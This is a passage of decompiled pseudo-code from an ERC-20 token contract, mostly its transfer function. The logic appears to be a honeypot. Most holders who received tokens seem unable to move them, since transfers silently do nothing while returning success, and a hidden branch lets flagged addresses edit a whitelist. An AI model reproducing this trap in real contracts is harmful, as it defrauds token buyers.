    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}

function transfer(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if stor14[address(msg.sender)] <= 0:
        if stor14[address(msg.sender)]:
            stor12[stor10[0]] = stor6
            stor10[0] = arg1
            if sub_6f0c6f41 <= 0:
                if balanceOf[address(msg.sender)] < arg2:
                    revert with 'NH{q', 17
                balanceOf[address(msg.sender)] -= arg2
                if balanceOf[address(arg1)] > -arg2 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)] += arg2
                emit Transfer(arg2, msg.sender, arg1);
            else:
                if stor8:
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 'NH{q', 17
                    balanceOf[address(msg.sender)] -= arg2
                    if balanceOf[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if stor14[address(msg.sender)]:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if stor14[address(arg1)]:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if arg2 and sub_6f0c6f41 > -1 / arg2:
                                revert with 'NH{q', 17
                            if arg2 < arg2 * sub_6f0c6f41 / 100:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2 * sub_6f0c6f41 / 100:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2 * sub_6f0c6f41 / 100
                            if balanceOf[address(msg.sender)] < arg2 - (arg2 * sub_6f0c6f41 / 100):
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * sub_6f0c6f41 / 100)
                            if balanceOf[address(arg1)] > -arg2 + (arg2 * sub_6f0c6f41 / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_6f0c6f41 / 100)
                            emit Transfer((arg2 - (arg2 * sub_6f0c6f41 / 100)), msg.sender, arg1);
        else:
            if msg.sender == uniswapV2PairAddress:
                stor12[stor10[0]] = stor6
                stor10[0] = arg1
                if sub_6f0c6f41 <= 0:
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 'NH{q', 17
                    balanceOf[address(msg.sender)] -= arg2
                    if balanceOf[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if stor8:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if stor14[address(msg.sender)]:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if stor14[address(arg1)]:
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if arg2 and sub_6f0c6f41 > -1 / arg2:
                                    revert with 'NH{q', 17
                                if arg2 < arg2 * sub_6f0c6f41 / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2 * sub_6f0c6f41 / 100:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2 * sub_6f0c6f41 / 100
                                if balanceOf[address(msg.sender)] < arg2 - (arg2 * sub_6f0c6f41 / 100):
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * sub_6f0c6f41 / 100)
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * sub_6f0c6f41 / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_6f0c6f41 / 100)
                                emit Transfer((arg2 - (arg2 * sub_6f0c6f41 / 100)), msg.sender, arg1);
            else:
                if stor12[address(msg.sender)] <= 0:
                    stor12[stor10[0]] = stor6
                    stor10[0] = arg1
                    if sub_6f0c6f41 <= 0:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if stor8:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if stor14[address(msg.sender)]:
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if stor14[address(arg1)]:
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg2 and sub_6f0c6f41 > -1 / arg2:
                                        revert with 'NH{q', 17
                                    if arg2 < arg2 * sub_6f0c6f41 / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2 * sub_6f0c6f41 / 100:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2 * sub_6f0c6f41 / 100
                                    if balanceOf[address(msg.sender)] < arg2 - (arg2 * sub_6f0c6f41 / 100):
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * sub_6f0c6f41 / 100)
                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * sub_6f0c6f41 / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_6f0c6f41 / 100)
                                    emit Transfer((arg2 - (arg2 * sub_6f0c6f41 / 100)), msg.sender, arg1);
    else:
        if stor8:
            if stor14[address(msg.sender)]:
                stor12[stor10[0]] = stor6
                stor10[0] = arg1
                if sub_6f0c6f41 <= 0:
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 'NH{q', 17
                    balanceOf[address(msg.sender)] -= arg2
                    if balanceOf[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if stor8:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if stor14[address(msg.sender)]:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if stor14[address(arg1)]:
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if arg2 and sub_6f0c6f41 > -1 / arg2:
                                    revert with 'NH{q', 17
                                if arg2 < arg2 * sub_6f0c6f41 / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2 * sub_6f0c6f41 / 100:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2 * sub_6f0c6f41 / 100
                                if balanceOf[address(msg.sender)] < arg2 - (arg2 * sub_6f0c6f41 / 100):
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * sub_6f0c6f41 / 100)
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * sub_6f0c6f41 / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_6f0c6f41 / 100)
                                emit Transfer((arg2 - (arg2 * sub_6f0c6f41 / 100)), msg.sender, arg1);
            else:
                if msg.sender == uniswapV2PairAddress:
                    stor12[stor10[0]] = stor6
                    stor10[0] = arg1
                    if sub_6f0c6f41 <= 0:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if stor8:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if stor14[address(msg.sender)]:
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if stor14[address(arg1)]:
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg2 and sub_6f0c6f41 > -1 / arg2:
                                        revert with 'NH{q', 17
                                    if arg2 < arg2 * sub_6f0c6f41 / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2 * sub_6f0c6f41 / 100:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2 * sub_6f0c6f41 / 100
                                    if balanceOf[address(msg.sender)] < arg2 - (arg2 * sub_6f0c6f41 / 100):
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * sub_6f0c6f41 / 100)
                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * sub_6f0c6f41 / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_6f0c6f41 / 100)
                                    emit Transfer((arg2 - (arg2 * sub_6f0c6f41 / 100)), msg.sender, arg1);
                else:
                    if stor12[address(msg.sender)] <= 0:
                        stor12[stor10[0]] = stor6
                        stor10[0] = arg1
                        if sub_6f0c6f41 <= 0:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if stor8:
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if stor14[address(msg.sender)]:
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if stor14[address(arg1)]:
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg2 and sub_6f0c6f41 > -1 / arg2:
                                            revert with 'NH{q', 17
                                        if arg2 < arg2 * sub_6f0c6f41 / 100:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2 * sub_6f0c6f41 / 100:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2 * sub_6f0c6f41 / 100
                                        if balanceOf[address(msg.sender)] < arg2 - (arg2 * sub_6f0c6f41 / 100):
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * sub_6f0c6f41 / 100)
                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * sub_6f0c6f41 / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_6f0c6f41 / 100)
                                        emit Transfer((arg2 - (arg2 * sub_6f0c6f41 / 100)), msg.sender, arg1);
        else:
            if arg2 > stor6:
                stor14[address(arg1)] = arg2
            else:
                if stor14[address(msg.sender)]:
                    stor12[stor10[0]] = stor6
                    stor10[0] = arg1
                    if sub_6f0c6f41 <= 0:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if stor8:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if stor14[address(msg.sender)]:
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if stor14[address(arg1)]:
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg2 and sub_6f0c6f41 > -1 / arg2:
                                        revert with 'NH{q', 17
                                    if arg2 < arg2 * sub_6f0c6f41 / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2 * sub_6f0c6f41 / 100:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2 * sub_6f0c6f41 / 100
                                    if balanceOf[address(msg.sender)] < arg2 - (arg2 * sub_6f0c6f41 / 100):
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * sub_6f0c6f41 / 100)
                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * sub_6f0c6f41 / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_6f0c6f41 / 100)
                                    emit Transfer((arg2 - (arg2 * sub_6f0c6f41 / 100)), msg.sender, arg1);
                else:
                    if msg.sender == uniswapV2PairAddress:
                        stor12[stor10[0]] = stor6
                        stor10[0] = arg1
                        if sub_6f0c6f41 <= 0:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if stor8:
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if stor14[address(msg.sender)]:
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if stor14[address(arg1)]:
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg2 and sub_6f0c6f41 > -1 / arg2:
                                            revert with 'NH{q', 17
                                        if arg2 < arg2 * sub_6f0c6f41 / 100:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2 * sub_6f0c6f41 / 100:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2 * sub_6f0c6f41 / 100
                                        if balanceOf[address(msg.sender)] < arg2 - (arg2 * sub_6f0c6f41 / 100):
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * sub_6f0c6f41 / 100)
                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * sub_6f0c6f41 / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_6f0c6f41 / 100)
                                        emit Transfer((arg2 - (arg2 * sub_6f0c6f41 / 100)), msg.sender, arg1);
                    else:
                        if stor12[address(msg.sender)] <= 0:
                            stor12[stor10[0]] = stor6
                            stor10[0] = arg1
                            if sub_6f0c6f41 <= 0:
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if stor8:
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if stor14[address(msg.sender)]:
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor14[address(arg1)]:
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if arg2 and sub_6f0c6f41 > -1 / arg2:
                                                revert with 'NH{q', 17
                                            if arg2 < arg2 * sub_6f0c6f41 / 100:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2 * sub_6f0c6f41 / 100:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2 * sub_6f0c6f41 / 100
                                            if balanceOf[address(msg.sender)] < arg2 - (arg2 * sub_6f0c6f41 / 100):
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * sub_6f0c6f41 / 100)
                                            if balanceOf[address(arg1)] > -arg2 + (arg2 * sub_6f0c6f41 / 100) - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_6f0c6f41 / 100)
                                            emit Transfer((arg2 - (arg2 * sub_6f0c6f41 / 100)), msg.sender, arg1);
    return 1
}



}
